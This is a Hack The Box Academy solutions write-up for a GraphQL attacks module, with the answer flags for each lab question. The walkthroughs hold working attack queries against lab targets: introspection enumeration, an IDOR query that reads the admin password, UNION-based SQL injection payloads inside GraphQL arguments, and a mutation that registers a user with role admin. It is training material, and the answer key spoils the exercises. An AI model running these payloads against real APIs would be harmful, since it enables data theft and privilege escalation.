
| Section                                 | Question Number | Answer                                |
| --------------------------------------- | --------------- | ------------------------------------- |
| Information Disclosure                  | Question 1      | HTB{ddd7c7354d1f06db3604b3bbc8ccf5cd} |
| Insecure Direct Object Reference (IDOR) | Question 1      | HTB{79ebbbce53f40edf75c667ef6fd36fae} |
| Injection Attacks                       | Question 1      | HTB{1105f1d9480ac244a0c8f2bc47594581} |
| Mutations                               | Question 1      | HTB{f7082828b5e5ad40d955846ba415d17f} |
| Skills Assessment                       | Question 1      | HTB{f1d663c11e6db634e1c9403d0e8e3a35} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Information Disclosure

## Question 1

### "After executing an introspection query, what is the flag you can exfiltrate?"

After spawning the target, students will proceed to clone [graphw00f](https://github.com/dolevf/graphw00f) to find and fingerprint the GraphQL endpoint on the target using the `-f` (fingerprint mode), `-d` (detect mode) and `-t` (target URL) options:

Code: shell

```shell
git clone https://github.com/dolevf/graphw00f
cd graphw00f
python3 main.py -f -d -t http://STMIP:STMPO
```

```
┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~]
└──╼ [★]$ git clone https://github.com/dolevf/graphw00f

Cloning into 'graphw00f'...
remote: Enumerating objects: 695, done.
remote: Counting objects: 100% (238/238), done.
remote: Compressing objects: 100% (115/115), done.
remote: Total 695 (delta 128), reused 152 (delta 115), pack-reused 457 (from 1)
Receiving objects: 100% (695/695), 561.05 KiB | 35.07 MiB/s, done.
Resolving deltas: 100% (375/375), done.

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~]
└──╼ [★]$ cd graphw00f

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~/graphw00f]
└──╼ [★]$ python3 main.py -f -d -t http://94.237.53.111:59300

<SNIP>

[*] Checking http://94.237.53.111:59300/
[*] Checking http://94.237.53.111:59300/graphql
[!] Found GraphQL at http://94.237.53.111:59300/graphql
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
[!] Technologies: Python
[!] Homepage: https://graphene-python.org
[*] Completed.
```

Students will open Firefox and visit the `/graphql` endpoint on the target (`http://STMIP:STMPO/graphql`). Subsequently, students will proceed to query the supported GraphQL types by the backend using the query, finding an object named `SecretObject`:

Code: graphql

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

![[HTB Solutions/Others/z. images/e3139a529881cc6c3192d01f0ae04af8_MD5.jpg]]

Next, having obtained the `SecretObject` type, students will proceed to get the type fields using the following introspection query, finding two fields `id` and `secret`:

Code: graphql

```graphql
{
  __type(name: "SecretObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

![[HTB Solutions/Others/z. images/0abd477e6f15a67da017532c52e8ae81_MD5.jpg]]

Subsequently, students will proceed to obtain the supported queries in GraphQL's backend with the following query to find the `secrets` supported query:

Code: graphql

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

![[HTB Solutions/Others/z. images/f150dcfbbe4fb24c8635b42543ebb44c_MD5.jpg]]

With the obtained information, students will proceed to use the `secrets` supported query specifying the `id` and `secret` fields to obtain the flag using the following query:

Code: graphql

```graphql
{
	secrets {
		id
		secret
	}
}
```

![[HTB Solutions/Others/z. images/98909195e6f1b17a1181125b039cb274_MD5.jpg]]

Answer: `HTB{ddd7c7354d1f06db3604b3bbc8ccf5cd}`

# Insecure Direct Object Reference (IDOR)

## Question 1

### "After following the steps in the section, what is the flag you can find in the admins password?"

After spawning the target, students will proceed to clone [graphw00f](https://github.com/dolevf/graphw00f) to find and fingerprint the GraphQL endpoint on the target using the `-f` (fingerprint mode), `-d` (detect mode) and `-t` (target URL) options:

Code: shell

```shell
git clone https://github.com/dolevf/graphw00f
cd graphw00f
python3 main.py -f -d -t http://STMIP:STMPO
```

```
┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~]
└──╼ [★]$ git clone https://github.com/dolevf/graphw00f

Cloning into 'graphw00f'...
remote: Enumerating objects: 695, done.
remote: Counting objects: 100% (238/238), done.
remote: Compressing objects: 100% (115/115), done.
remote: Total 695 (delta 128), reused 152 (delta 115), pack-reused 457 (from 1)
Receiving objects: 100% (695/695), 561.05 KiB | 35.07 MiB/s, done.
Resolving deltas: 100% (375/375), done.

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~]
└──╼ [★]$ cd graphw00f

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~/graphw00f]
└──╼ [★]$ python3 main.py -f -d -t http://94.237.53.111:59300

<SNIP>

[*] Checking http://94.237.53.111:59300/
[*] Checking http://94.237.53.111:59300/graphql
[!] Found GraphQL at http://94.237.53.111:59300/graphql
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
[!] Technologies: Python
[!] Homepage: https://graphene-python.org
[*] Completed.
```

Students will open Firefox and visit the `/graphql` endpoint on the target (`http://STMIP:STMPO/graphql`). Subsequently, students will proceed to query the supported GraphQL types by the backend using the query, finding an object named `UserObject`:

Code: graphql

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

![[HTB Solutions/Others/z. images/396b6f0e75f130475349cb180253a952_MD5.jpg]]

Next, having obtained the `UserObject` type, students will proceed to get the type fields using the following introspection query, revealing the fields' `username` and `password` alongside others:

Code: graphql

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

![[HTB Solutions/Others/z. images/25f5dc34028177dfe88ca597ae7923c8_MD5.jpg]]

Subsequently, students will proceed to obtain the supported queries in GraphQL's backend with the following query to find the `user` supported query:

Code: graphql

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

![[HTB Solutions/Others/z. images/ca6ae428d7013a0000c18342ab82506b_MD5.jpg]]

Next, students will use the insecure direct object reference targeting the `admin` user using the `user` supported query and the fields `username` and `password` to obtain the flag:

Code: graphql

```graphql
{
  user(username: "admin") {
    username
    password
  }
}
```

![[HTB Solutions/Others/z. images/541c4ed11e7578584f3676c94cfba910_MD5.jpg]]

Answer: `HTB{79ebbbce53f40edf75c667ef6fd36fae}`

# Injection Attacks

## Question 1

### "Exploit the SQL injection vulnerability to exfiltrate data from the database. What is the flag you find?"

After spawning the target, students will proceed to clone [graphw00f](https://github.com/dolevf/graphw00f) to find and fingerprint the GraphQL endpoint on the target using the `-f` (fingerprint mode), `-d` (detect mode) and `-t` (target URL) options:

Code: shell

```shell
git clone https://github.com/dolevf/graphw00f
cd graphw00f
python3 main.py -f -d -t http://STMIP:STMPO
```

```
┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~]
└──╼ [★]$ git clone https://github.com/dolevf/graphw00f

Cloning into 'graphw00f'...
remote: Enumerating objects: 695, done.
remote: Counting objects: 100% (238/238), done.
remote: Compressing objects: 100% (115/115), done.
remote: Total 695 (delta 128), reused 152 (delta 115), pack-reused 457 (from 1)
Receiving objects: 100% (695/695), 561.05 KiB | 35.07 MiB/s, done.
Resolving deltas: 100% (375/375), done.

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~]
└──╼ [★]$ cd graphw00f

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~/graphw00f]
└──╼ [★]$ python3 main.py -f -d -t http://94.237.53.111:59300

<SNIP>

[*] Checking http://94.237.53.111:59300/
[*] Checking http://94.237.53.111:59300/graphql
[!] Found GraphQL at http://94.237.53.111:59300/graphql
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
[!] Technologies: Python
[!] Homepage: https://graphene-python.org
[*] Completed.
```

Students will open Firefox and visit the `/graphql` endpoint on the target (`http://STMIP:STMPO/graphql`). Subsequently, students will utilize the `graphql` SQL injection payload from the section to display the tables in the database, finding a table called `flag`:

Code: graphql

```graphql
{
  user(username: "student' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

![[HTB Solutions/Others/z. images/7bafe401ab1ed24489df08cffaf4a1b3_MD5.jpg]]

Next, students will modify the `graphql` SQL injection payload to display the columns in the `flag` table to find the columns `id` and `flag` in the table:

Code: graphql

```graphql
{
  user(username: "student' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -") {
    username
  }
}
```

![[HTB Solutions/Others/z. images/f3270d4ebab4c31a6dfbffe98aa20629_MD5.jpg]]

Subsequently, students will modify the `graphql` SQL injection payload to grab the value (flag) in the `flag` column of the `flag` table:

Code: graphql

```graphql
{
  user(username: "student' UNION SELECT 1,2,flag,4,5,6 FROM flag-- -") {
    username
  }
}
```

![[HTB Solutions/Others/z. images/f81ad07dba2dbfb6f40d14f72238b422_MD5.jpg]]

Answer: `HTB{1105f1d9480ac244a0c8f2bc47594581}`

# Mutations

## Question 1

### "What is the flag you find in the admin dashboard?"

After spawning the target, students will proceed to clone [graphw00f](https://github.com/dolevf/graphw00f) to find and fingerprint the GraphQL endpoint on the target using the `-f` (fingerprint mode), `-d` (detect mode) and `-t` (target URL) options:

Code: shell

```shell
git clone https://github.com/dolevf/graphw00f
cd graphw00f
python3 main.py -f -d -t http://STMIP:STMPO
```

```
┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~]
└──╼ [★]$ git clone https://github.com/dolevf/graphw00f

Cloning into 'graphw00f'...
remote: Enumerating objects: 695, done.
remote: Counting objects: 100% (238/238), done.
remote: Compressing objects: 100% (115/115), done.
remote: Total 695 (delta 128), reused 152 (delta 115), pack-reused 457 (from 1)
Receiving objects: 100% (695/695), 561.05 KiB | 35.07 MiB/s, done.
Resolving deltas: 100% (375/375), done.

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~]
└──╼ [★]$ cd graphw00f

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~/graphw00f]
└──╼ [★]$ python3 main.py -f -d -t http://94.237.53.111:59300

<SNIP>

[*] Checking http://94.237.53.111:59300/
[*] Checking http://94.237.53.111:59300/graphql
[!] Found GraphQL at http://94.237.53.111:59300/graphql
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
[!] Technologies: Python
[!] Homepage: https://graphene-python.org
[*] Completed.
```

Students will open Firefox and visit the `/graphql` endpoint on the target (`http://STMIP:STMPO/graphql`). Subsequently, students will utilize the introspection query from the section to look for mutations supported by the backend of the target finding the `registerUser` mutation and the `RegisterUserInput` object:

Code: graphql

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

![[HTB Solutions/Others/z. images/229409d0541b5a4e1b274f31d64e17fe_MD5.jpg]]

Next, students will query the fields of the `RegisterUserInput` object to obtain the fields that can be used in the mutation, finding the `username`, `password`, `role` and `msg` input fields using the following query:

Code: graphql

```graphql
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

![[HTB Solutions/Others/z. images/c3368d47302296b6efa3d02966078605_MD5.jpg]]

Students will open a terminal and will choose a password to be converted into an MD5 hash which will be used in the subsequent registration step:

Code: shell

```shell
echo -n 'StudentAcademy' | md5sum
```

```
┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-3ffingchf8]─[~]
└──╼ [★]$ echo -n 'StudentAcademy' | md5sum

0be3788074058f551b16e601e2e79b30  -
```

Next, students will register a new user using the mutation specifying `admin` as the role for the user in the `role` field and placing the hashed password in the `password` file using the following query:

Code: graphql

```graphql
mutation {
  registerUser(input: {username: "AcademyStudent", password: "0be3788074058f551b16e601e2e79b30", role: "admin", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

![[HTB Solutions/Others/z. images/04843ea0af1aec0b9ba8a17d6efa218c_MD5.jpg]]

Subsequently, students will open a new tab in Firefox, visit the root login page of the target, and log in using the credentials of the newly created user:

![[HTB Solutions/Others/z. images/359016992ea19d26218f6ef354060547_MD5.jpg]]

Students will navigate to the `Admin Area` to obtain the flag:

![[HTB Solutions/Others/z. images/64b43d97e4ab685c15022b9dcf8ed55e_MD5.jpg]]

Answer: `HTB{f7082828b5e5ad40d955846ba415d17f}`

# Skills Assessment

## Question 1

### "Exploit the vulnerable GraphQL API to obtain the flag."

After spawning the target, students will proceed to clone [graphw00f](https://github.com/dolevf/graphw00f) to find and fingerprint the GraphQL endpoint on the target using the `-f` (fingerprint mode), `-d` (detect mode) and `-t` (target URL) options:

Code: shell

```shell
git clone https://github.com/dolevf/graphw00f
cd graphw00f
python3 main.py -f -d -t http://STMIP:STMPO
```

```
┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~]
└──╼ [★]$ git clone https://github.com/dolevf/graphw00f

Cloning into 'graphw00f'...
remote: Enumerating objects: 695, done.
remote: Counting objects: 100% (238/238), done.
remote: Compressing objects: 100% (115/115), done.
remote: Total 695 (delta 128), reused 152 (delta 115), pack-reused 457 (from 1)
Receiving objects: 100% (695/695), 561.05 KiB | 35.07 MiB/s, done.
Resolving deltas: 100% (375/375), done.

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-ijv6pgu0fq]─[~]
└──╼ [★]$ cd graphw00f

┌─[eu-academy-5]─[10.10.15.120]─[htb-ac-8414@htb-3ffingchf8]─[~/graphw00f]
└──╼ [★]$ python3 main.py -f -d -t http://94.237.53.18:33724

<SNIP>
  
[*] Checking http://94.237.53.18:33724/
[*] Checking http://94.237.53.18:33724/graphql
[!] Found GraphQL at http://94.237.53.18:33724/graphql
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Graphene)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
[!] Technologies: Python
[!] Homepage: https://graphene-python.org
[*] Completed.
```

Students will open Firefox and visit the `/graphql` endpoint on the target (`http://STMIP:STMPO/graphql`). Subsequently, students will perform information disclosure using introspection to obtain information about types, fields and queries supported by the backend.

Code: graphql

```graphql
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

Subsequently, students will use [graphql-voyager](https://graphql-kit.com/graphql-voyager/), change the schema to introspection, and copy and paste the output from the previous GraphQL query into graphql-voyager to parse the data:

![[HTB Solutions/Others/z. images/2822119225ef5e98f0ed4d50dd7d4868_MD5.jpg]]

Students will be presented with a visualization of the queries and objects:

![[HTB Solutions/Others/z. images/04e5edddb8b229d831940205901d2c07_MD5.jpg]]

Next, students will notice the `activeApiKeys` object, and they will query it to obtain the API key `0711a879ed751e63330a78a4b195bbad` for the `admin` role using the following query on the target and take note of it:

Code: graphql

```graphql
{
	activeApiKeys {
		id
		role
		key
	}
}
```

![[HTB Solutions/Others/z. images/49f100a891628f79f49cfebb2fa1e46a_MD5.jpg]]

Subsequently, students will query the `allCustomers` object to gain information about the customers such as `id`, `firstName`, `lastName`, and `address` with the API key found earlier using the following query and take note of the customer's `firstName` and `lastName` values:

```graphql
{
	allCustomers (apiKey: "0711a879ed751e63330a78a4b195bbad") {
		id
		firstName
		lastName
		address
	}
}
```

![[HTB Solutions/Others/z. images/44657a57c739afcd1a62c8798c020508_MD5.jpg]]

Next, students will use the `customerByName` object, specify the `apiKey`, and specify one of the three last names for`lastName` from the previous GraphQL query, and test for a SQL Injection vulnerability by injecting a single quote using the following query:

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "Blair'") {
    firstName
    lastName
    address
  }
}
```

![[HTB Solutions/Others/z. images/f3603d7def010c7debb1f09ebb05096d_MD5.jpg]]

Having verified the SQL injection vulnerability, students will proceed to query the number of columns using `UNION SELECT` statement to identify 4 columns matching the number of columns in the original query:

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "Blair' UNION SELECT 1,2,3,4 -- -") {
	id
    firstName
    lastName
    address
  }
}
```

![[HTB Solutions/Others/z. images/2b94f3277d05658d54f5961d3f167277_MD5.jpg]]

Next, students will query the tables in the database to find the `flag` table using the SQL injection vulnerability and the following query and use the first name of the customer instead:

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "Antony' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database() -- -") {
	id
    firstName
    lastName
    address
  }
}
```

![[HTB Solutions/Others/z. images/e748c56c6993037a63dd1f9e9286ea0b_MD5.jpg]]

Next, students will modify the `graphql` SQL injection to obtain the flag in the `flag` table:

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "Antony' UNION SELECT 1,2,flag,4 FROM flag-- -") {
	  id
    firstName
    lastName
    address
  }
}
```

![[HTB Solutions/Others/z. images/be9fec348c4c8895db9ed5975fe1a62c_MD5.jpg]]

Answer: `HTB{f1d663c11e6db634e1c9403d0e8e3a35}`